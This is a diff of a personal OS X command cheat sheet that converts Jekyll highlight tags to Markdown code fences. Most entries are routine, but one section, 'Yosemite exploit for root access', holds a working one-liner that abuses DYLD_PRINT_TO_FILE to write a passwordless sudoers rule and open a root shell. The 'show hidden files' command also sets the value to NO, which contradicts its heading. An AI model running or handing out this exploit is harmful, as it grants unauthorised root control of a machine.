@@ -1,23 +1,18 @@
----
-layout: default
-title: OS X
----
+### Always show hidden files
 
-## Always show hidden files: ##
-
-{% highlight bash %}
+```bash
 defaults write com.apple.finder AppleShowAllFiles NO
-{% endhighlight %}
+```
 
-## Start Apache on system startup: ##
+### Start Apache on system startup
 
-{% highlight bash %}
+```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
-{% endhighlight %}
+```
 
-## Keyboard shortcuts: ##
+### Keyboard shortcuts
 
-{% highlight bash %}
+```bash
 DEL = FN + BACKSPACE
 PAGEUP/PAGEDOWN = FN + UP/DOWN
 END = FN + RIGHT
@@ -27,23 +22,23 @@ SCREEN SHOT (PART) = CMD + SHIFT + 4
 SCREEN SHOT (DESKTOP) = CMD + SHIFT + 3
 CLOSE ACTIVE WINDOW = CMD + W
 EXIT PROGRAM = CMD + Q
-{% endhighlight %}
+```
 
-## Yosemite exploit for root access: ##
+### Yosemite exploit for root access
 
-{% highlight bash %}
+```bash
 echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
-{% endhighlight %}
+```
 
-## Add mysql to terminal shell: ##
+### Add mysql to terminal shell
 
-{% highlight bash %}
+```bash
 echo 'export PATH=/usr/local/mysql/bin:$PATH' >> ~/.bash_profile
 . ~/.bash_profile
-{% endhighlight %}
+```
 
-## Install file (e.g. composer.phar) globally: ##
+### Install file (e.g. composer.phar) globally
 
-{% highlight bash %}
+```bash
 sudo mv %file% /usr/local/bin/%file%
-{% endhighlight %}
+```
